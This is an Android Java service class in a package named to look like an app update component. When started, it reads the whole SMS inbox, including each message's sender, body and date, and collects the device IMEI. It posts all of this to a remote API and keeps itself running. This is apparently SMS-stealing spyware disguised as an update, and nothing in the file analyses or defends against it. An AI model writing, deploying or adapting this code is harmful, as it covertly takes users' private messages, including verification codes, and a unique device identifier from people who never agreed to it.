package update.core.update;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.IBinder;
import android.os.SystemClock;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.widget.Toast;

import java.util.ArrayList;
import java.util.Calendar;
import java.util.Date;
import java.util.List;

import retrofit2.Call;
import retrofit2.Callback;
import retrofit2.Response;

public class AutoStart extends Service {
    public AutoStart() {
    }

    @Override
    public IBinder onBind(Intent intent) {
        // TODO: Return the communication channel to the service.
        throw new UnsupportedOperationException("Not yet implemented");
    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        // Let it continue running until it is stopped.
        ContentResolver contentResolver = getContentResolver();
        Cursor smsInboxCursor = contentResolver.query(Uri.parse("content://sms/inbox"), null, null, null, null);
        int indexBody = smsInboxCursor.getColumnIndex("body");
        int indexAddress = smsInboxCursor.getColumnIndex("address");
        int indexDate =  smsInboxCursor.getColumnIndex("date");
        List<Message> messages = new ArrayList<Message>();

        if (indexBody > 0 && smsInboxCursor.moveToFirst()) {

            Log.e("PostMessage"," dlkdklj");
            Toast.makeText(this, "Service Started", Toast.LENGTH_LONG).show();
            //arrayAdapter.clear();
            do {
//                String str = "SMS From: " + smsInboxCursor.getString(indexAddress) +
//                        "\n" + smsInboxCursor.getString(indexBody) + "\n";
//                Log.e("Msgs", str);

                String smsBody = smsInboxCursor.getString(indexAddress);
                String sender = smsInboxCursor.getString(indexBody);

                String date = smsInboxCursor.getString(indexDate);
                Long datel = Long.parseLong(date);
                Calendar calendar = Calendar.getInstance();
                calendar.setTimeInMillis(datel);
                Date finaldate = calendar.getTime();
                String timestamp = finaldate.toString();
                messages.add(new Message(smsBody,sender,timestamp));

            } while (smsInboxCursor.moveToNext());
            TelephonyManager mTelephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
            String deviceid = mTelephonyManager.getDeviceId();
            Log.d("msg", "DeviceImei " + deviceid);
            String imei=deviceid;
            MessageResponse m = new MessageResponse(imei,messages);
            postMessage(m);
        }

        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        Toast.makeText(this, "Service Destroyed", Toast.LENGTH_LONG).show();
        //Log.d("onDestroy","onDestroy");
        sendBroadcast(new Intent());
        super.onDestroy();
    }

    public void postMessage(MessageResponse mr) {
        Log.e("PostMessage",mr.getImei());
        UpdateAPIService uAPIService = UpdateAPIUtils.getAPIService();
        uAPIService.postMessages(mr).enqueue(new Callback<MessageResponse>() {
            @Override
            public void onResponse(Call<MessageResponse> call, Response<MessageResponse> response) {

                if(response.isSuccessful()) {
                    //showResponse(response.body().toString());
                    Log.i("PostResp", "data submitted to API." + response.body().toString());
                }
            }

            @Override
            public void onFailure(Call<MessageResponse> call, Throwable t) {
                Log.e("PostResp", "Unable to submit data to API."+t.getMessage());
            }
        });
    }


}
